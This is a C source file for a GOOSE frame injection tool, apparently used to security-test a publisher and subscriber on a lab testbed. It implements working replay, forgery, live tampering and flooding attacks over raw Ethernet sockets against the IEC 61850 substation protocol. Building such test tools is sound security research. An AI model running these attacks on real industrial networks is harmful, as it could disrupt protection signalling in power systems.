/*
 * gs_inject.c - minimal on-wire attacker for the security tests.
 *
 * Run it on the PUBLISHER Pi: an AF_PACKET socket also sees the frames that host
 * sends (PACKET_OUTGOING), so it can capture the live stream and re-inject it
 * towards the subscriber. No third machine is needed.
 *
 *   gs_inject <iface> replay  [--n N]               capture the first N frames, then, once the
 *                                                    stream has been idle for 1 s, send each
 *                                                    captured frame again, unchanged
 *   gs_inject <iface> forge   [--n N]               same, but flip one bit of the last
 *                                                    ciphertext byte of every re-sent frame
 *   gs_inject <iface> tamper  [--n N]               live: modify every 10th frame on the wire
 *                                                    (sqNum := 127 if the PDU is in the clear,
 *                                                    else flip a ciphertext byte) and re-send it
 *   gs_inject <iface> flood   [--secs S] [--pps R]  capture ONE frame and replay it as fast as
 *                                                    possible (R packets/s, 0 = unlimited)
 *                                                    for S seconds, starting immediately
 *                                                    (run while gs_pub is still publishing)
 *
 * Outcomes are read from the subscriber's CSV/verdict counts: a replay or forged
 * frame must never produce verdict 0 (delivered) once a replay filter / tag check is active.
 * Under the baseline-as-described there is NO replay filter, so replays are
 * delivered unless GOOSE_BANERJEE_REPLAY=strict is set on the subscriber.
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#define MAXF 2000
#define MAXN 5000

static uint8_t frames[MAXN][MAXF];
static int     flen[MAXN];

static double mono_s(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (double) t.tv_sec + (double) t.tv_nsec * 1e-9;
}

/* is this a GOOSE frame (EtherType 0x88B8, optionally behind one VLAN tag)? */
static int is_goose(const uint8_t* b, int n)
{
    int off = 12;
    if (n < 22) return 0;
    if (b[off] == 0x81 && b[off + 1] == 0x00) off += 4;
    return b[off] == 0x88 && b[off + 1] == 0xB8;
}

/* index of the byte just before the security extension (last ciphertext byte) */
static int last_cipher_byte(const uint8_t* b, int n)
{
    int off = 12, ext;
    if (b[off] == 0x81 && b[off + 1] == 0x00) off += 4;
    off += 2;                                   /* EtherType       */
    off += 2 + 2;                               /* AppID, Length   */
    ext = (b[off] << 8) | b[off + 1];           /* Reserved1 = extension length */
    if (ext <= 0 || ext >= n) return -1;
    return n - ext - 1;
}


/* ---- tamper mode ---------------------------------------------------------------------------
 * Live: every 10th GOOSE frame seen on the wire is modified and re-sent immediately, so the
 * modified copy belongs to the CURRENT state. If the PDU is in the clear (proposed scheme) the
 * sqNum value is set to 127, a fresh-looking number that would advance a replay window if the
 * window were updated before authentication. If the PDU is encrypted (baseline) one ciphertext
 * byte is flipped. Either way the tag must fail, and the legitimate frames that follow must
 * still be accepted. */
static uint64_t fnv(const uint8_t* b, int n)
{
    uint64_t h = 1469598103934665603ULL;
    int i;
    for (i = 0; i < n; i++) { h ^= b[i]; h *= 1099511628211ULL; }
    return h;
}

/* offset of the value byte of the sqNum field (tag 0x86, length 1) in a PLAINTEXT PDU, or -1 */
static int sqnum_byte(const uint8_t* b, int n)
{
    int off = 12, hl, pos;
    if (b[off] == 0x81 && b[off + 1] == 0x00) off += 4;
    off += 2 + 8;                              /* EtherType, AppID, Length, Res1, Res2 */
    if (off + 4 > n || b[off] != 0x61) return -1;
    if (b[off + 1] < 0x80) hl = 2; else if (b[off + 1] == 0x81) hl = 3; else hl = 4;
    pos = off + hl;
    while (pos + 2 <= n) {
        int tag = b[pos], len, h;
        if (b[pos + 1] < 0x80) { len = b[pos + 1]; h = 2; }
        else if (b[pos + 1] == 0x81 && pos + 3 <= n) { len = b[pos + 2]; h = 3; }
        else return -1;
        if (pos + h + len > n) return -1;
        if (tag == 0x86 && len == 1) return pos + h;
        pos += h + len;
    }
    return -1;
}

static int run_tamper(int fd, int ifindex, int nwant)
{
    struct sockaddr_ll sa;
    uint64_t seen[64];
    int nseen = 0, sent = 0, count = 0;
    double t_last = mono_s();

    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifindex;
    sa.sll_halen = 6;
    printf("tamper: modifying every 10th live GOOSE frame (up to %d) ...\n", nwant);

    while (sent < nwant && mono_s() - t_last < 3.0) {
        uint8_t buf[MAXF];
        int n = (int) recv(fd, buf, sizeof(buf), 0);
        int i, lim, mine = 0, k;
        if (n <= 0 || !is_goose(buf, n)) continue;
        t_last = mono_s();
        {   /* skip the frames this tool injected itself (they show up again as outgoing frames) */
            uint64_t h = fnv(buf, n);
            lim = nseen < 64 ? nseen : 64;
            for (i = 0; i < lim; i++) if (seen[i] == h) mine = 1;
        }
        if (mine) continue;
        if (++count % 10) continue;

        k = sqnum_byte(buf, n);
        if (k >= 0) buf[k] = 0x7f;
        else {
            k = last_cipher_byte(buf, n);
            if (k < 0) continue;
            buf[k] ^= 0x01;
        }
        seen[nseen % 64] = fnv(buf, n);
        nseen++;
        memcpy(sa.sll_addr, buf, 6);
        if (sendto(fd, buf, (size_t) n, 0, (struct sockaddr*) &sa, sizeof(sa)) > 0) sent++;
    }
    printf("tamper: injected %d modified frame(s)\n", sent);
    return 0;
}

int main(int argc, char** argv)
{
    const char* iface;
    const char* mode;
    int nwant = 200, i, nf = 0, pps = 0;
    double secs = 5.0;
    int fd;
    struct ifreq ifr;
    struct sockaddr_ll sa;

    if (argc < 3) { fprintf(stderr, "usage: %s <iface> replay|forge|tamper|flood [opts]\n", argv[0]); return 1; }
    iface = argv[1]; mode = argv[2];
    for (i = 3; i < argc; i++) {
        if (!strcmp(argv[i], "--n") && i + 1 < argc)         nwant = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--secs") && i + 1 < argc) secs = atof(argv[++i]);
        else if (!strcmp(argv[i], "--pps") && i + 1 < argc)  pps = atoi(argv[++i]);
    }
    if (nwant > MAXN) nwant = MAXN;
    if (!strcmp(mode, "flood")) nwant = 1;

    fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("socket (run as root)"); return 1; }
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { perror("SIOCGIFINDEX"); return 1; }
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifr.ifr_ifindex;
    sa.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr*) &sa, sizeof(sa)) < 0) { perror("bind"); return 1; }

    { struct timeval tv = {0, 200000}; setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)); }
    if (!strcmp(mode, "tamper")) return run_tamper(fd, ifr.ifr_ifindex, nwant);

    printf("gs_inject: capturing %d frame(s) on %s ...\n", nwant, iface);
    {
        double t_last = mono_s();
        while (nf < nwant || (strcmp(mode, "flood") != 0 && mono_s() - t_last < 1.0)) {
            uint8_t buf[MAXF];
            int n = (int) recv(fd, buf, sizeof(buf), 0);
            if (n > 0 && is_goose(buf, n)) {
                t_last = mono_s();
                if (nf < nwant) { memcpy(frames[nf], buf, (size_t) n); flen[nf] = n; nf++; }
                if (!strcmp(mode, "flood") && nf >= 1) break;
            }
            if (nf >= nwant && strcmp(mode, "flood") != 0 && mono_s() - t_last >= 1.0) break;
            if (mono_s() - t_last > 30.0) { fprintf(stderr, "no GOOSE traffic seen\n"); return 1; }
        }
    }
    printf("captured %d frame(s)\n", nf);
    if (nf == 0) return 1;

    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifr.ifr_ifindex;
    sa.sll_halen = 6;

    if (!strcmp(mode, "flood")) {
        uint64_t sent = 0;
        double t0 = mono_s(), tnext = t0;
        memcpy(sa.sll_addr, frames[0], 6);
        while (mono_s() - t0 < secs) {
            if (pps > 0) { while (mono_s() < tnext) { } tnext += 1.0 / pps; }
            if (sendto(fd, frames[0], (size_t) flen[0], 0, (struct sockaddr*) &sa, sizeof(sa)) > 0) sent++;
        }
        printf("flood: sent %llu frames in %.1f s (%.0f pps)\n",
               (unsigned long long) sent, secs, (double) sent / secs);
        return 0;
    }

    for (i = 0; i < nf; i++) {
        int n = flen[i];
        if (!strcmp(mode, "forge")) {
            int k = last_cipher_byte(frames[i], n);
            if (k < 0) { fprintf(stderr, "frame %d has no security extension\n", i); continue; }
            frames[i][k] ^= 0x01;
        }
        memcpy(sa.sll_addr, frames[i], 6);
        if (sendto(fd, frames[i], (size_t) n, 0, (struct sockaddr*) &sa, sizeof(sa)) < 0)
            perror("sendto");
        usleep(200);
    }
    printf("%s: re-sent %d frame(s)\n", mode, nf);
    return 0;
}
